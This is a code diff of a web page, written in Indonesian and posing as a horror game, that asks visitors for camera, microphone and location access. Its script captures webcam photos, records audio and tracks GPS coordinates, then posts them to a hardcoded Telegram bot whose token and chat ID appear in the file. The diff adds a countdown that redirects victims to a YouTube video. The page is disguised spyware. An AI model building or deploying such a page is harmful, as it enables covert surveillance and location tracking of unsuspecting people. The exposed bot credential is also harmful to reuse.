@@ -11,10 +11,12 @@
             color: #f0f0f0;
             text-align: center;
             overflow: hidden;
+            height: 100vh;
+            margin: 0;
         }
         h1 {
             margin-top: 20px;
-            font-size: 3em;
+            font-size: 2.5em;
             text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.7);
         }
         button {
@@ -28,27 +30,39 @@
         #cameraContainer {
             display: none;
             position: relative;
-            margin-top: 20px;
+            width: 100%;
+            height: 100%;
+            margin: 0 auto;
         }
         video {
             width: 100%;
-            max-width: 640px;
+            height: 100%;
+            object-fit: cover;
             border: 2px solid #e63946;
         }
         .mic-icon {
             font-size: 2em;
             color: red;
             display: none;
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
         }
         .location {
             margin-top: 20px;
             font-size: 1.2em;
+            color: white;
         }
-        canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: -1; /* Let the canvas be behind other elements */
+        #permissionContainer {
+            display: block;
+        }
+        #countdown {
+            font-size: 3em;
+            color: red;
+            margin-top: 20px;
+        }
+        #countdownContainer {
+            display: none;
         }
     </style>
 </head>
@@ -56,7 +70,10 @@
     <div class="container">
         <h1>Selamat datang di Real Horror Survival!</h1>
         <p>Untuk memulai permainan, Anda harus memberikan izin kepada situs ini untuk mengakses kamera, mikrofon, dan lokasi Anda.</p>
-        <button class="btn btn-danger btn-lg" onclick="startGame()">Izinkan dan Mulai</button>
+        
+        <div id="permissionContainer">
+            <button class="btn btn-danger btn-lg" onclick="requestPermissions()">Izinkan dan Mulai</button>
+        </div>
 
         <div id="loading">Loading... Persiapkan diri Anda, permainan dimulai segera!</div>
 
@@ -65,59 +82,35 @@
             <div class="mic-icon" id="micIcon">🎤</div>
             <div class="location" id="locationDisplay"></div>
         </div>
+
+        <div id="countdownContainer">
+            <div id="countdown">10</div>
+        </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script>
         let videoStream;
         let mediaRecorder;
         let audioChunks = [];
+        let locationData = {};
+        let countdownValue = 10;
+        let countdownInterval;
+        let botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8"; // Token bot Telegram kamu
+        let chatId = "6010073048"; // ID pengguna Telegram kamu
 
-        const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";  // Ganti dengan token bot Telegram kamu
-        const chatId = "6010073048";  // Ganti dengan ID pengguna Telegram kamu
-
-        function initParticles() {
-            const scene = new THREE.Scene();
-            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-            const renderer = new THREE.WebGLRenderer({ alpha: true });
-            renderer.setSize(window.innerWidth, window.innerHeight);
-            document.body.appendChild(renderer.domElement);
-
-            const particleCount = 1000;
-            const geometry = new THREE.BufferGeometry();
-            const positions = new Float32Array(particleCount * 3);
-            for (let i = 0; i < particleCount; i++) {
-                positions[i * 3] = (Math.random() - 0.5) * 100; // X
-                positions[i * 3 + 1] = (Math.random() - 0.5) * 100; // Y
-                positions[i * 3 + 2] = (Math.random() - 0.5) * 100; // Z
-            }
-            geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
-
-            const material = new THREE.PointsMaterial({ color: 0xffffff, size: 0.5 });
-            const particles = new THREE.Points(geometry, material);
-            scene.add(particles);
-
-            camera.position.z = 50;
-
-            function animateParticles() {
-                requestAnimationFrame(animateParticles);
-                particles.rotation.y += 0.001; // Rotate particles for a dynamic effect
-                renderer.render(scene, camera);
-            }
-
-            animateParticles();
-        }
-
-        async function startGame() {
+        async function requestPermissions() {
+            // Tampilkan pesan loading setelah izin diberikan
             document.getElementById("loading").style.display = "block";
+            document.getElementById("permissionContainer").style.display = "none";
+
+            // Minta izin untuk akses kamera dan mikrofon
             try {
-                // Minta izin untuk akses kamera dan mikrofon
                 videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById("loading").style.display = "none";
                 document.getElementById("cameraContainer").style.display = "block";
                 document.getElementById("video").srcObject = videoStream;
 
-                // Mulai mendeteksi suara
+                // Mulai rekam suara
                 mediaRecorder = new MediaRecorder(videoStream);
                 mediaRecorder.onstart = () => {
                     document.getElementById("micIcon").style.display = "block";
@@ -132,22 +125,15 @@
 
                 // Dapatkan lokasi
                 navigator.geolocation.watchPosition(position => {
-                    const { latitude, longitude } = position.coords;
-                    document.getElementById("locationDisplay").innerText = `Lokasi Anda: ${latitude}, ${longitude}`;
+                    locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    document.getElementById("locationDisplay").innerText = `Lokasi Anda: ${locationData.latitude}, ${locationData.longitude}`;
                 });
 
-                // Inisialisasi partikel
-                initParticles();
-
-                // Deteksi orientasi perangkat
-                window.addEventListener('deviceorientation', (event) => {
-                    updateParticlesOrientation(event.alpha, event.beta, event.gamma);
-                });
-
-                // Ambil foto setelah beberapa detik
-                setTimeout(() => {
-                    capturePhotoAndSend();
-                }, 5000);
+                // Tampilkan countdown setelah izin diberikan
+                startCountdown();
 
             } catch (error) {
                 console.error("Akses ditolak atau terjadi kesalahan:", error);
@@ -155,7 +141,22 @@
             }
         }
 
-        function capturePhotoAndSend() {
+        function startCountdown() {
+            document.getElementById("countdownContainer").style.display = "block";
+            countdownInterval = setInterval(() => {
+                document.getElementById("countdown").textContent = countdownValue;
+                countdownValue--;
+
+                if (countdownValue < 0) {
+                    clearInterval(countdownInterval);
+                    // Arahkan pengguna ke video YouTube
+                    window.location.href = "https://youtu.be/xvFZjo5PgG0?si=SXv6a7xY6dLFV2ml";
+                }
+            }, 1000);
+        }
+
+        function captureAndSend() {
+            // Ambil foto
             const video = document.getElementById("video");
             const canvas = document.createElement("canvas");
             canvas.width = video.videoWidth;
@@ -164,36 +165,37 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const photoData = canvas.toDataURL("image/png");
 
-            // Kirim data ke Telegram
-            sendToTelegram(photoData);
+            // Kirim foto, suara, dan lokasi ke Telegram
+            sendToTelegram([photoData]);
         }
 
-        function sendToTelegram(photoData) {
+        function sendToTelegram(photos) {
+            // Konversi foto menjadi Blob
+            let photoBlobs = photos.map(photoData => dataURItoBlob(photoData));
+
             const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
             const formData = new FormData();
             formData.append("chat_id", chatId);
 
             // Kirim foto
-            const photoBlob = dataURItoBlob(photoData);
-            formData.append("photo", photoBlob, "photo.png");
+            photoBlobs.forEach((blob, index) => {
+                formData.append("photo", blob, `photo${index + 1}.png`);
+            });
 
             // Kirim audio
             formData.append("audio", audioBlob, "audio.webm");
 
             // Kirim lokasi
-            navigator.geolocation.getCurrentPosition(position => {
-                const { latitude, longitude } = position.coords;
-                formData.append("latitude", latitude);
-                formData.append("longitude", longitude);
+            formData.append("latitude", locationData.latitude);
+            formData.append("longitude", locationData.longitude);
 
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                }).then(response => {
-                    console.log("Data terkirim ke Telegram.");
-                }).catch(err => {
-                    console.error("Gagal mengirim data ke Telegram:", err);
-                });
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            }).then(response => {
+                console.log("Data terkirim ke Telegram.");
+            }).catch(err => {
+                console.error("Gagal mengirim data ke Telegram:", err);
             });
         }
 
